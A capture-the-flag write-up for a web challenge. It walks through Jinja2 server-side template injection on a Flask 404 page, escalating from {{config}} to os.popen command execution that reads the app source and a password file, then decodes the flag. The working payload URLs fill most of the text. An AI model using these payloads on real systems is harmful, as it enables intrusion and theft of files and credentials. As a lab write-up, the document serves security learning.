# Injection(Web) - Writeup

## description

````
Our local pharmacy exposed admin login to the public, can you exploit it?
http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/
````


## answer

When you access the specified URL, the screen of the syringe and the screen of username/password will be displayed.

````
┌──(root💀kali)-[/home/kali]
└─# curl -v http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/                                              
*   Trying 20.76.104.236:8080...
* Connected to dctf1-chall-injection.westeurope.azurecontainer.io (20.76.104.236) port 8080 (#0)
> GET / HTTP/1.1
> Host: dctf1-chall-injection.westeurope.azurecontainer.io:8080
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Length: 812
< Content-Type: text/html; charset=utf-8
< Date: Sat, 15 May 2021 04:10:23 GMT
< Server: waitress
< 

<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    img {
    display: block;
    margin-left: auto;
    margin-right: auto;
    }
    fieldset{
    border: 1px solid;
    width: 400px;
    margin:auto;
    }
    </style>
</head>
<body>
    <img src="/static/index.png">
    <form id='login' action='login' method='post' accept-charset='UTF-8'>
        <fieldset>
            <legend>Admin Login</legend>
            User:<br />
            <input type='text' name='username' id='username'  maxlength="50" /><br />
            Password:<br />
            <input type='password' name='password' id='password' maxlength="50" /><br />
            <input type='submit' name='Submit' value='Submit' />
        </fieldset>
    </form>
</body>
* Connection #0 to host dctf1-chall-injection.westeurope.azurecontainer.io left intact
</html>
````

The following access result confirms that it is SSTI.

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Bconfig%7D%7D

```
Oops! Page <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'MESSAGE': 'You are getting closer!'}> doesn't exist :(
```

Identify the Template engine as jinja2.

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7B__selt__.__doc__%7D%7D

```
Oops! Page The default undefined type. This undefined type can be printed and iterated over, but every other access will raise an :exc:`UndefinedError`: >>> foo = Undefined(name='foo') >>> str(foo) '' >>> not foo True >>> foo + 42 Traceback (most recent call last): ... jinja2.exceptions.UndefinedError: 'foo' is undefined doesn't exist :(
```

Check `current_app`.

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Burl_for.__globals__%7D%7D

```
Oops! Page {'__name__': 'flask.helpers', '__doc__': '\n flask.helpers\n ~~~~~~~~~~~~~\n\n Implements various helpers.\n\n :copyright: 2010 Pallets\n :license: BSD-3-Clause\n', '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f267eabf760>, '__spec__': ModuleSpec(name='flask.helpers', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f267eabf760>, origin='/usr/local/lib/python3.9/site-packages/flask/helpers.py'), '__file__': '/usr/local/lib/python3.9/site-packages/flask/helpers.py', '__cached__': '/usr/local/lib/python3.9/site-packages/flask/__pycache__/helpers.cpython-39.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'io': <module 'io' from '/usr/local/lib/python3.9/io.py'>, 'mimetypes': <module 'mimetypes' from '/usr/local/lib/python3.9/mimetypes.py'>, 'os': <module 'os' from '/usr/local/lib/python3.9/os.py'>, 'pkgutil': <module 'pkgutil' from '/usr/local/lib/python3.9/pkgutil.py'>, 'posixpath': <module 'posixpath' from '/usr/local/lib/python3.9/posixpath.py'>, 'socket': <module 'socket' from '/usr/local/lib/python3.9/socket.py'>, 'sys': <module 'sys' (built-in)>, 'unicodedata': <module 'unicodedata' from '/usr/local/lib/python3.9/lib-dynload/unicodedata.cpython-39-x86_64-linux-gnu.so'>, 'update_wrapper': <function update_wrapper at 0x7f267fdab430>, 'RLock': <function RLock at 0x7f267fd1b1f0>, 'time': <built-in function time>, 'adler32': <built-in function adler32>, 'FileSystemLoader': <class 'jinja2.loaders.FileSystemLoader'>, 'Headers': <class 'werkzeug.datastructures.Headers'>, 'BadRequest': <class 'werkzeug.exceptions.BadRequest'>, 'NotFound': <class 'werkzeug.exceptions.NotFound'>, 'RequestedRangeNotSatisfiable': <class 'werkzeug.exceptions.RequestedRangeNotSatisfiable'>, 'BuildError': <class 'werkzeug.routing.BuildError'>, 'url_quote': <function url_quote at 0x7f267f2d1c10>, 'wrap_file': <function wrap_file at 0x7f267ee4e4c0>, 'fspath': <built-in function fspath>, 'PY2': False, 'string_types': (<class 'str'>,), 'text_type': <class 'str'>, '_app_ctx_stack': <werkzeug.local.LocalStack object at 0x7f267ed0c5e0>, '_request_ctx_stack': <werkzeug.local.LocalStack object at 0x7f267ed0c220>, 'current_app': <Flask 'app'>, 'request': <Request 'http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Burl_for.__globals__%7D%7D' [GET]>, 'session': <NullSession {}>, 'message_flashed': <flask.signals._FakeSignal object at 0x7f267ea81cd0>, '_missing': <object object at 0x7f267ef094b0>, '_os_alt_seps': [], 'get_env': <function get_env at 0x7f267eaaee50>, 'get_debug_flag': <function get_debug_flag at 0x7f267eaaeee0>, 'get_load_dotenv': <function get_load_dotenv at 0x7f267ea9b1f0>, '_endpoint_from_view_func': <function _endpoint_from_view_func at 0x7f267ea9b280>, 'stream_with_context': <function stream_with_context at 0x7f267ea9b310>, 'make_response': <function make_response at 0x7f267ea9b3a0>, 'url_for': <function url_for at 0x7f267ea9b430>, 'get_template_attribute': <function get_template_attribute at 0x7f267ea9b4c0>, 'flash': <function flash at 0x7f267ea9b550>, 'get_flashed_messages': <function get_flashed_messages at 0x7f267ea9b5e0>, 'send_file': <function send_file at 0x7f267ea9b670>, 'safe_join': <function safe_join at 0x7f267ea9b700>, 'send_from_directory': <function send_from_directory at 0x7f267ea9b790>, 'get_root_path': <function get_root_path at 0x7f267ea9b820>, '_matching_loader_thinks_module_is_package': <function _matching_loader_thinks_module_is_package at 0x7f267ea9b8b0>, '_find_package_path': <function _find_package_path at 0x7f267ea9b940>, 'find_package': <function find_package at 0x7f267ea9b9d0>, 'locked_cached_property': <class 'flask.helpers.locked_cached_property'>, '_PackageBoundObject': <class 'flask.helpers._PackageBoundObject'>, 'total_seconds': <function total_seconds at 0x7f267ea9ba60>, 'is_ip': <function is_ip at 0x7f267ea9d1f0>} doesn't exist :(
```

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Burl_for.__globals__.current_app.__dict__%7D%7D

```
Oops! Page {'import_name': '__main__', 'template_folder': 'templates', 'root_path': '/app', '_static_folder': 'static', '_static_url_path': None, 'cli': <AppGroup app>, 'instance_path': '/app/instance', 'config': <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'MESSAGE': 'You are getting closer!'}>, 'view_functions': {'static': <bound method _PackageBoundObject.send_static_file of <Flask 'app'>>, 'index': <function index at 0x7f267ec2f5e0>}, 'error_handler_spec': {None: {404: {<class 'werkzeug.exceptions.NotFound'>: <function page_not_found at 0x7f267ec2f550>}}}, 'url_build_error_handlers': [], 'before_request_funcs': {}, 'before_first_request_funcs': [], 'after_request_funcs': {}, 'teardown_request_funcs': {}, 'teardown_appcontext_funcs': [], 'url_value_preprocessors': {}, 'url_default_functions': {}, 'template_context_processors': {None: [<function _default_template_ctx_processor at 0x7f267ea8a430>]}, 'shell_context_processors': [], 'blueprints': {}, '_blueprint_order': [], 'extensions': {}, 'url_map': Map([<Rule '/' (OPTIONS, HEAD, GET) -> index>, <Rule '/static/<filename>' (OPTIONS, HEAD, GET) -> static>]), 'subdomain_matching': False, '_got_first_request': True, '_before_request_lock': <unlocked _thread.lock object at 0x7f267fe60870>, 'name': 'app', 'jinja_env': <flask.templating.Environment object at 0x7f267ebbc7f0>, 'logger': <Logger app (WARNING)>} doesn't exist :(
```

Execute OS commands.

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Burl_for.__globals__.os.__dict__.popen('cat%20app.py').read()%7D%7D

```
<h1>Oops! Page import logging

from flask import Flask, render_template_string, request
from waitress import serve

#from lib.security import validate_login
from templates.error_page import error_page_template
from templates.index_page import index_page_template


app = Flask(__name__)
app.config[&#39;MESSAGE&#39;] = &#39;You are getting closer!&#39;

logger = logging.getLogger(&#39;waitress&#39;)
logger.setLevel(logging.INFO)

@app.errorhandler(404)
def page_not_found(e):
    evils = [&#39;&#34;/&#39;, &#34;&#39;/&#34;, &#34;..&#34;, &#39;random&#39;, &#39;null&#39;, &#39;dev&#39;, &#39;zero&#39;, &#39;run&#39;, &#39;etc&#39;]
    path = request.path[1:]
    
    if any(evil in path for evil in evils):
        logger.info(&#34;{}: [EVIL] {}&#34;.format(request.remote_addr, path))
        path = &#39;&#39;
    else:
        logger.info(&#34;{}: {}&#34;.format(request.remote_addr, path))

    return render_template_string(error_page_template.format(path)), 404


@app.route(&#39;/&#39;)
def index():
    return render_template_string(index_page_template)


#@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
#def login():
#    if validate_login(request.form[&#39;name&#39;], request.form[&#39;pass&#39;]):
#      #TODO: redirect to user page
#    else:
#      #TODO: wrong password
#


if __name__ == &#39;__main__&#39;:
    serve(app, listen=&#39;*:8080&#39;)
 doesn't exist :(</h1>
```

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Burl_for.__globals__.os.__dict__.popen('ls%20-al%20/').read()%7D%7D

```
<h1>Oops! Page total 72
drwxr-xr-x    1 root     root          4096 May 15 06:30 .
drwxr-xr-x    1 root     root          4096 May 15 06:30 ..
-rwxr-xr-x    1 root     root             0 May 15 06:30 .dockerenv
dr-xr-xr-x    1 root     root          4096 May 14 01:33 app
drwxr-xr-x    1 root     root          4096 Apr  1 09:14 bin
drwxr-xr-x    5 root     root           360 May 15 06:30 dev
drwxr-xr-x    1 root     root          4096 May 15 06:30 etc
drwxr-xr-x    2 root     root          4096 Mar 31 16:51 home
drwxr-xr-x    1 root     root          4096 Apr  1 09:14 lib
drwxr-xr-x    5 root     root          4096 Mar 31 16:51 media
drwxr-xr-x    2 root     root          4096 Mar 31 16:51 mnt
drwxr-xr-x    2 root     root          4096 Mar 31 16:51 opt
dr-xr-xr-x  171 root     root             0 May 15 06:30 proc
-rw-r--r--    1 root     root           112 May 14 01:32 requirements.txt
drwx------    1 root     root          4096 May 14 01:33 root
drwxr-xr-x    2 root     root          4096 Mar 31 16:51 run
drwxr-xr-x    1 root     root          4096 Apr  1 09:14 sbin
drwxr-xr-x    2 root     root          4096 Mar 31 16:51 srv
dr-xr-xr-x   12 root     root             0 May 15 06:29 sys
drwxrwxrwt    1 root     root          4096 May 15 06:41 tmp
drwxr-xr-x    1 root     root          4096 Apr  1 09:14 usr
drwxr-xr-x    1 root     root          4096 May 15 06:30 var
 doesn't exist :(</h1>
```

The default connection directory is under the /app folder.
There is a 'lib' folder, a 'templates' folder, an 'app.py' file, and a 'static' folder.

There is a security.py file under the /app/lib folder.

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Burl_for.__globals__.os.__dict__.popen('ls%20-al%20/app/lib').read()%7D%7D

```
<h1>Oops! Page total 12
dr-xr-xr-x    1 root     root          4096 May 14 01:32 .
dr-xr-xr-x    1 root     root          4096 May 14 01:33 ..
-r--r--r--    1 root     root           279 May 14 01:32 security.py
 doesn't exist :(</h1>
```

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/%7B%7Burl_for.__globals__.os.__dict__.popen('cat%20/app/lib/security.py').read()%7D%7D

```
<h1>Oops! Page import base64

def validate_login(username, password):
    if username != &#39;admin&#39;:
        return False
    
    valid_password = &#39;QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ&#39;
    return base64.b64encode(password.encode(&#39;ascii&#39;)).decode(&#39;ascii&#39;)[::-1].lstrip(&#39;=&#39;) == valid_password

 doesn't exist :(</h1>
```

If the result of base64 encoding the password you entered and then reversing it is equal to `QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ`, you will be able to log in.

```
┌──(root💀kali)-[/home/kali/Desktop/tplmap-master]
└─# echo -n "QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ" | rev                               1 ⨯
ZGN0Zns0bGxfdXMzcl8xbnB1dF8xc18zdjFsfQ                                                                                             
┌──(root💀kali)-[/home/kali/Desktop/tplmap-master]
└─# echo -n "ZGN0Zns0bGxfdXMzcl8xbnB1dF8xc18zdjFsfQ" | base64 -d
dctf{4ll_us3r_1nput_1s_3v1l}base64: 無効な入力
```
The password was set to FLAG.

###### dctf{4ll_us3r_1nput_1s_3v1l}
